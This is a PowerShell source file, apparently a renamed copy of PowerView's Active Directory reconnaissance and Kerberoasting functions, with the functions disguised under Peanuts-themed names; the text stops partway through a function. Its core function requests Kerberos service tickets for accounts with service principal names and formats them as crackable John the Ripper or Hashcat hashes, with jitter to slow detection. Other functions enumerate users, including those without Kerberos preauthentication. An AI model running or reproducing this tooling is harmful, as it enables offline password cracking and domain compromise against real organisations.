function Get-SnoopyDoghouse {
<#
.PARAMETER Domain
Specifies the domain to use for the query, defaults to the current domain.
.PARAMETER LDAPFilter
Specifies an LDAP query string that is used to filter Active Directory objects.
.PARAMETER Properties
Specifies the properties of the output object to retrieve from the server.
.PARAMETER SearchBase
The LDAP source to search through, e.g. "LDAP://OU=secret,DC=peanuts,DC=local"
Useful for OU queries.
.PARAMETER SearchBasePrefix
Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").
.PARAMETER Server
Specifies an Active Directory server (domain controller) to bind to for the search.
.PARAMETER SearchScope
Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
.PARAMETER ResultPageSize
Specifies the PageSize to set for the LDAP searcher object.
.PARAMETER ResultPageSize
Specifies the PageSize to set for the LDAP searcher object.
.PARAMETER ServerTimeLimit
Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
.PARAMETER SecurityMasks
Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
.PARAMETER Tombstone
Switch. Specifies that the searcher should also return deleted/tombstoned objects.
.PARAMETER Credential
A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
.EXAMPLE
Get-SnoopyDoghouse -Domain peanuts.local
Return a searcher for all objects in peanuts.local.
.EXAMPLE
Get-SnoopyDoghouse -Domain peanuts.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'
Return a searcher for user objects in peanuts.local and only return the SamAccountName and LastLogon properties.
.EXAMPLE
Get-SnoopyDoghouse -SearchBase "LDAP://OU=secret,DC=peanuts,DC=local"
Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).
.OUTPUTS
System.DirectoryServices.DirectorySearcher
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain
        }
        else {
            # if not -Domain is specified, retrieve the current domain name
            if ($PSBoundParameters['Credential']) {
                $DomainObject = Get-Neighborhood -Credential $Credential
            }
            else {
                $DomainObject = Get-Neighborhood
            }
            $TargetDomain = $DomainObject.Name
        }

        if (-not $PSBoundParameters['Server']) {
            # if there's not a specified server to bind to, try to pull the current domain PDC
            try {
                if ($DomainObject) {
                    $BindServer = $DomainObject.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $BindServer = ((Get-Neighborhood -Credential $Credential).PdcRoleOwner).Name
                }
                else {
                    $BindServer = ((Get-Neighborhood).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[Get-SnoopyDoghouse] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                # if we're searching the global catalog, get the path in the right format
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            # transform the target domain name into a distinguishedName if an ADS search base is not specified
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "[Get-SnoopyDoghouse] search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-SnoopyDoghouse] Using alternate credentials for LDAP connection"
            # bind to the inital search object using alternate credentials
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # bind to the inital object using the current credentials
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-WoodstockChirp {
<#
.SYNOPSIS
Helper that converts specific LDAP property result fields and outputs
a custom psobject.
Required Dependencies: None  
.DESCRIPTION
Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Neighborhood* function.
.PARAMETER Properties
Properties object to extract out LDAP fields for display.
.OUTPUTS
System.Management.Automation.PSCustomObject
A custom PSObject with LDAP hashtable properties translated.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # convert all listed sids (i.e. if multiple are listed in sidHistory)
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                # convert the GUID to a string
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # convert timestamps
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    # if we have a System.__ComObject
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    # otherwise just a string
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # try to convert misc com objects
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-WoodstockChirp] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-WoodstockChirp] Error parsing LDAP properties : $_"
    }
}


function Get-Neighborhood {
<#
.SYNOPSIS
Returns the domain object for the current (or specified) domain.
Required Dependencies: None  
.DESCRIPTION
Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.
.PARAMETER Domain
Specifies the domain name to query for, defaults to the current domain.
.PARAMETER Credential
A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
.EXAMPLE
Get-Neighborhood -Domain peanuts.local
.EXAMPLE
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('PEANUTS\linus', $SecPassword)
Get-Neighborhood -Credential $Cred
.OUTPUTS
System.DirectoryServices.ActiveDirectory.Domain
A complex .NET domain object.
#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-Neighborhood] Using alternate credentials for Get-Neighborhood'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Neighborhood] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Neighborhood] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Neighborhood] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Neighborhood] Error retrieving the current domain: $_"
            }
        }
    }
}



function Get-GreatPumpkinTicket {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will either take one/more SPN strings, or one/more Peanuts.Kid objects
(the output from Get-NeighborhoodKid) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of John).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a Peanuts.Kid object (result of Get-NeighborhoodKid) to request the ticket for.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'John'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote domain using Invoke-UserImpersonation.

.PARAMETER Delay

Specifies the delay in seconds between ticket requests.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.EXAMPLE

Get-GreatPumpkinTicket -SPN "HTTP/web.peanuts.local"

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

"HTTP/web1.peanuts.local","HTTP/web2.peanuts.local" | Get-GreatPumpkinTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-NeighborhoodKid -SPN | Get-GreatPumpkinTicket -OutputFormat Hashcat

Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

Peanuts.Kid

Accepts one or more Peanuts.Kid objects on the pipeline with the User parameter set.

.OUTPUTS

Peanuts.PumpkinTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType('Peanuts.PumpkinTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'Peanuts.Kid' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John',

        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }
	
	$RandNo = New-Object System.Random

        ForEach ($Object in $TargetObject) {

            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :)
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-GreatPumpkinTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline from that field"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline from that field"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        # hashcat output format
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }

                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'Peanuts.PumpkinTicket')
                Write-Output $Out
            }
            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Get-NeighborhoodKid {
<#
.SYNOPSIS
Return all users or specific user objects in AD.
Required Dependencies: Get-SnoopyDoghouse, Convert-ADName, Convert-WoodstockChirp  
.DESCRIPTION
Builds a directory searcher object using Get-SnoopyDoghouse, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all user objects for
the current domain are returned.
.PARAMETER Identity
A SamAccountName (e.g. charlie), DistinguishedName (e.g. CN=charlie,CN=Users,DC=peanuts,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted. Also accepts DOMAIN\user format.
.PARAMETER SPN
Switch. Only return user objects with non-null service principal names.
.PARAMETER UACFilter
Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.
.PARAMETER AdminCount
Switch. Return users with '(adminCount=1)' (meaning are/were privileged).
.PARAMETER AllowDelegation
Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'
.PARAMETER DisallowDelegation
Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'
.PARAMETER TrustedToAuth
Switch. Return computer objects that are trusted to authenticate for other principals.
.PARAMETER PreauthNotRequired
Switch. Return user accounts with "Do not require Kerberos preauthentication" set.
.PARAMETER Domain
Specifies the domain to use for the query, defaults to the current domain.
.PARAMETER LDAPFilter
Specifies an LDAP query string that is used to filter Active Directory objects.
.PARAMETER Properties
Specifies the properties of the output object to retrieve from the server.
.PARAMETER SearchBase
The LDAP source to search through, e.g. "LDAP://OU=secret,DC=peanuts,DC=local"
Useful for OU queries.
.PARAMETER Server
Specifies an Active Directory server (domain controller) to bind to.
.PARAMETER SearchScope
Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
.PARAMETER ResultPageSize
Specifies the PageSize to set for the LDAP searcher object.
.PARAMETER ServerTimeLimit
Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
.PARAMETER SecurityMasks
Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
.PARAMETER Tombstone
Switch. Specifies that the searcher should also return deleted/tombstoned objects.
.PARAMETER FindOne
Only return one result object.
.PARAMETER Credential
A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
.PARAMETER Raw
Switch. Return raw results instead of translating the fields into a custom PSObject.
.EXAMPLE
Get-NeighborhoodKid -Domain peanuts.local
Return all users for the peanuts.local domain
.EXAMPLE
Get-NeighborhoodKid "S-1-5-21-890171859-3433809279-3366196753-1108","administrator"
Return the user with the given SID, as well as Administrator.
.EXAMPLE
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=lucy,CN=Users,DC=peanuts,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-NeighborhoodKid -Properties samaccountname,lastlogoff
lastlogoff                                   samaccountname
----------                                   --------------
12/31/1600 4:00:00 PM                        linus
12/31/1600 4:00:00 PM                        lucy
12/31/1600 4:00:00 PM                        charlie
12/31/1600 4:00:00 PM                        Administrator
.EXAMPLE
Get-NeighborhoodKid -SearchBase "LDAP://OU=secret,DC=peanuts,DC=local" -AdminCount -AllowDelegation
Search the specified OU for privileged user (AdminCount = 1) that allow delegation
.EXAMPLE
Get-NeighborhoodKid -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon
Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon
.EXAMPLE
Get-NeighborhoodKid -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED
Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.
.EXAMPLE
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('PEANUTS\linus', $SecPassword)
Get-NeighborhoodKid -Credential $Cred
.EXAMPLE
Get-Neighborhood | Select-Object -Expand name
peanuts.local
Get-NeighborhoodKid dev\user1 -Verbose -Properties distinguishedname
VERBOSE: [Get-SnoopyDoghouse] search string: LDAP://PRIMARY.peanuts.local/DC=peanuts,DC=local
VERBOSE: [Get-SnoopyDoghouse] search string: LDAP://PRIMARY.peanuts.local/DC=dev,DC=peanuts,DC=local
VERBOSE: [Get-NeighborhoodKid] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))
distinguishedname
-----------------
CN=user1,CN=Users,DC=dev,DC=peanuts,DC=local
.INPUTS
String
.OUTPUTS
Peanuts.Kid
Custom PSObject with translated user property fields.
Peanuts.Kid.Raw
The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('Peanuts.Kid')]
    [OutputType('Peanuts.Kid.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )
<#
    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }
#>
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-SnoopyDoghouse @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        #if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
        #    New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        #}

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-NeighborhoodKid] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-SnoopyDoghouse @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-NeighborhoodKid] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
